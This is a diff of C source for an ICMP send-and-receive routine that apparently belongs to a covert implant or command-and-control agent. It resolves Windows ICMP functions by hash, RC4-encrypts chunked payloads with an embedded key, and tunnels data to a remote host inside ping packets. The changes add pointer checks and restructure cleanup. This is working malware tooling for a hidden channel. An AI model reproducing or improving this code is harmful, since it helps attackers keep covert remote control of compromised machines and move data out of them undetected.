@@ -229,20 +229,22 @@ D_SEC( B ) BOOL IcmpSendRecv( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UIN
 													/* Final packet. Check if we have return data */
 													if ( ( Idx + 1 ) == Seq.ChunkTotal && Seq.Id != Sqp->Id ) {
 														if ( Sqp->ChunkTotal >= 1 ) {
-															/*  Read the response!: Note, chunk if needed, go to next field */
-															if ( ( *OuBuffer = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) ) ) ) {
+															if ( OuBuffer != NULL && OuLength != NULL && OuSuccess != NULL ) {
+																/*  Read the response!: Note, chunk if needed, go to next field */
+																if ( ( *OuBuffer = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) ) ) ) {
 					
-																/* Set response chunk(s) */
-																Max = Sqp->ChunkTotal;
+																	/* Set response chunk(s) */
+																	Max = Sqp->ChunkTotal;
 	
-																/* Set response UID */
-																Uid = Sqp->Id;
+																	/* Set response UID */
+																	Uid = Sqp->Id;
 
-																/* Copy over buffer */
-																__builtin_memcpy( *OuBuffer, Sqp->Buffer, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) );
+																	/* Copy over buffer */
+																	__builtin_memcpy( *OuBuffer, Sqp->Buffer, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) );
 
-																/* Set length */
-																*OuLength = Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT );
+																	/* Set length */
+																	*OuLength = Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT );
+																};
 															};
 															/* Status */
 															Ret = TRUE; 
@@ -306,75 +308,79 @@ D_SEC( B ) BOOL IcmpSendRecv( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UIN
 				};
 
 				/* Success */
-				if ( *OuBuffer != NULL ) {
-					if ( Max > 1 ) {
-						/* Set headers */
-						Hdr.Signature  = 0xFEFE;
-						Seq.Id         = Uid;
-						Seq.ChunkTotal = Max;
+				if ( OuBuffer != NULL && OuLength != NULL && OuSuccess != NULL ) {
+					if ( *OuBuffer != NULL ) {
+						if ( Max > 1 ) {
+							/* Set headers */
+							Hdr.Signature  = 0xFEFE;
+							Seq.Id         = Uid;
+							Seq.ChunkTotal = Max;
 
-						/* Grab the rest of the chunks */
-						for ( INT Idx = 1 ; Idx < Max ; ++Idx ) {
-							if ( ( Snd = BufferCreate() ) != NULL ) {
-								if ( ! BufferAddRaw( Snd, &Hdr, sizeof( Hdr ) ) ) break;
-								if ( ! BufferAddRaw( Snd, &Seq, sizeof( Seq ) ) ) break;
+							/* Grab the rest of the chunks */
+							for ( INT Idx = 1 ; Idx < Max ; ++Idx ) {
+								if ( ( Snd = BufferCreate() ) != NULL ) {
+									if ( ! BufferAddRaw( Snd, &Hdr, sizeof( Hdr ) ) ) break;
+									if ( ! BufferAddRaw( Snd, &Seq, sizeof( Seq ) ) ) break;
 
-								/* Set headers */
-								Hdp = C_PTR( Snd->Buffer );
-								Sqp = C_PTR( Hdp->Buffer );
-								Sqp->ChunkNumber = Idx + 1;
+									/* Set headers */
+									Hdp = C_PTR( Snd->Buffer );
+									Sqp = C_PTR( Hdp->Buffer );
+									Sqp->ChunkNumber = Idx + 1;
 
-								/* Set key and buffer */
-								Key.Length = Key.MaximumLength = KEY_LENGTH; // note: make me configurable 
-								Key.Buffer = C_PTR( G_PTR( KEY ) );
-								Rc4.Length = Rc4.MaximumLength = sizeof( SEQ_PKT );
-								Rc4.Buffer = C_PTR( Sqp );
+									/* Set key and buffer */
+									Key.Length = Key.MaximumLength = KEY_LENGTH; // note: make me configurable 
+									Key.Buffer = C_PTR( G_PTR( KEY ) );
+									Rc4.Length = Rc4.MaximumLength = sizeof( SEQ_PKT );
+									Rc4.Buffer = C_PTR( Sqp );
 
-								/* Encrypt the buffer */
-								if ( NT_SUCCESS( Api.SystemFunction032( &Rc4, &Key ) ) ) {
-									/* Init ICMP API */
-									Api.IcmpCloseHandle = PeGetFuncEat( Icp, H_API_ICMPCLOSEHANDLE );
-									Api.IcmpCreateFile  = PeGetFuncEat( Icp, H_API_ICMPCREATEFILE );
-									Api.IcmpSendEcho    = PeGetFuncEat( Icp, H_API_ICMPSENDECHO );
+									/* Encrypt the buffer */
+									if ( NT_SUCCESS( Api.SystemFunction032( &Rc4, &Key ) ) ) {
+										/* Init ICMP API */
+										Api.IcmpCloseHandle = PeGetFuncEat( Icp, H_API_ICMPCLOSEHANDLE );
+										Api.IcmpCreateFile  = PeGetFuncEat( Icp, H_API_ICMPCREATEFILE );
+										Api.IcmpSendEcho    = PeGetFuncEat( Icp, H_API_ICMPSENDECHO );
 
-									if ( ( Icf = Api.IcmpCreateFile() ) != INVALID_HANDLE_VALUE ) {
-										if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &( PCHAR ){ ( CHAR ){ 0x0 } }, &Ip4 ) ) ) {
-											if ( ( Rcv = BufferCreate() ) != NULL ) {
-												if ( BufferExtend( Rcv, ICMP_CHUNK_SIZE + 1024 ) ) {
-													if ( Api.IcmpSendEcho( Icf, Ip4.s_addr, Snd->Buffer, Snd->Length, NULL, Rcv->Buffer, Rcv->Length, 5000 ) ) {
-														Rep = C_PTR( Rcv->Buffer );
+										if ( ( Icf = Api.IcmpCreateFile() ) != INVALID_HANDLE_VALUE ) {
+											if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &( PCHAR ){ ( CHAR ){ 0x0 } }, &Ip4 ) ) ) {
+												if ( ( Rcv = BufferCreate() ) != NULL ) {
+													if ( BufferExtend( Rcv, ICMP_CHUNK_SIZE + 1024 ) ) {
+														if ( Api.IcmpSendEcho( Icf, Ip4.s_addr, Snd->Buffer, Snd->Length, NULL, Rcv->Buffer, Rcv->Length, 5000 ) ) {
+															Rep = C_PTR( Rcv->Buffer );
 
-														if ( Rep->DataSize > sizeof( SEQ_PKT ) + sizeof( HDR_PKT ) ) 
-														{
-															Hdp = C_PTR( Rep->Data );
+															if ( Rep->DataSize > sizeof( SEQ_PKT ) + sizeof( HDR_PKT ) ) 
+															{
+																Hdp = C_PTR( Rep->Data );
 
-															/* Is a valid response packet? */
-															if ( Hdp->Signature != 0xFFFF ) {
-																break;
-															};
-
-															Sqp = C_PTR( Hdp->Buffer );
-															Rc4.Length = Rc4.MaximumLength = Rep->DataSize - sizeof( HDR_PKT );
-															Rc4.Buffer = C_PTR( Hdp->Buffer );
-
-															if ( NT_SUCCESS( Api.SystemFunction032( &Rc4, &Key ) ) ) {
-																if ( ( Idx + 1 ) != Seq.ChunkTotal && Seq.Id != Sqp->Id ) {
+																/* Is a valid response packet? */
+																if ( Hdp->Signature != 0xFFFF ) {
 																	break;
 																};
-																/* Create a new buffer to hold the length */
-																if ( ( Tmp = Api.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, *OuBuffer, *OuLength + Rc4.Length - sizeof( SEQ_PKT ) ) ) ) {
-																	/* Set the pointer */
-																	*OuBuffer = C_PTR( Tmp );
 
-																	/* Copy over the buffer */
-																	__builtin_memcpy( C_PTR( U_PTR( *OuBuffer ) + *OuLength ), Sqp->Buffer, Rc4.Length - sizeof( SEQ_PKT ) );
+																Sqp = C_PTR( Hdp->Buffer );
+																Rc4.Length = Rc4.MaximumLength = Rep->DataSize - sizeof( HDR_PKT );
+																Rc4.Buffer = C_PTR( Hdp->Buffer );
 
-																	/* Set new length */
-																	*OuLength = *OuLength + Rc4.Length - sizeof( SEQ_PKT );
+																if ( NT_SUCCESS( Api.SystemFunction032( &Rc4, &Key ) ) ) {
+																	if ( ( Idx + 1 ) != Seq.ChunkTotal && Seq.Id != Sqp->Id ) {
+																		break;
+																	};
+																	/* Create a new buffer to hold the length */
+																	if ( ( Tmp = Api.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, *OuBuffer, *OuLength + Rc4.Length - sizeof( SEQ_PKT ) ) ) ) {
+																		/* Set the pointer */
+																		*OuBuffer = C_PTR( Tmp );
 
-																	/* Is this our last packet ? */
-																	if ( ( Idx + 1 ) == Max ) {
-																		*OuSuccess = TRUE;
+																		/* Copy over the buffer */
+																		__builtin_memcpy( C_PTR( U_PTR( *OuBuffer ) + *OuLength ), Sqp->Buffer, Rc4.Length - sizeof( SEQ_PKT ) );
+
+																		/* Set new length */
+																		*OuLength = *OuLength + Rc4.Length - sizeof( SEQ_PKT );
+
+																		/* Is this our last packet ? */
+																		if ( ( Idx + 1 ) == Max ) {
+																			*OuSuccess = TRUE;
+																		};
+																	} else {
+																		break;
 																	};
 																} else {
 																	break;
@@ -388,53 +394,51 @@ D_SEC( B ) BOOL IcmpSendRecv( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UIN
 													} else {
 														break;
 													};
+													/* Cleanup */
+													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
+													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv );
+													Rcv = NULL;
 												} else {
 													break;
 												};
-												/* Cleanup */
-												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
-												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv );
-												Rcv = NULL;
 											} else {
 												break;
 											};
+											Api.IcmpCloseHandle( Icf ); Icf = INVALID_HANDLE_VALUE;
 										} else {
 											break;
 										};
-										Api.IcmpCloseHandle( Icf ); Icf = INVALID_HANDLE_VALUE;
 									} else {
 										break;
 									};
+
+									/* Free Buffer */
+									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd->Buffer );
+									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd );
+									Snd = NULL;
 								} else {
 									break;
 								};
-
-								/* Free Buffer */
+							};
+							/* Cleanup */
+							if ( Snd != NULL ) {
 								Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd->Buffer );
 								Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd );
 								Snd = NULL;
-							} else {
-								break;
 							};
+							if ( Rcv != NULL ) {
+								Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
+								Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv );
+								Rcv = NULL;
+							};
+							if ( Icf != INVALID_HANDLE_VALUE ) {
+								Api.IcmpCloseHandle( Icf ); 
+								Icf = INVALID_HANDLE_VALUE;
+							};
+						} else {
+							/* Status */
+							*OuSuccess = TRUE;
 						};
-						/* Cleanup */
-						if ( Snd != NULL ) {
-							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd->Buffer );
-							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd );
-							Snd = NULL;
-						};
-						if ( Rcv != NULL ) {
-							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
-							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv );
-							Rcv = NULL;
-						};
-						if ( Icf != INVALID_HANDLE_VALUE ) {
-							Api.IcmpCloseHandle( Icf ); 
-							Icf = INVALID_HANDLE_VALUE;
-						};
-					} else {
-						/* Status */
-						*OuSuccess = TRUE;
 					};
 				};
 			};
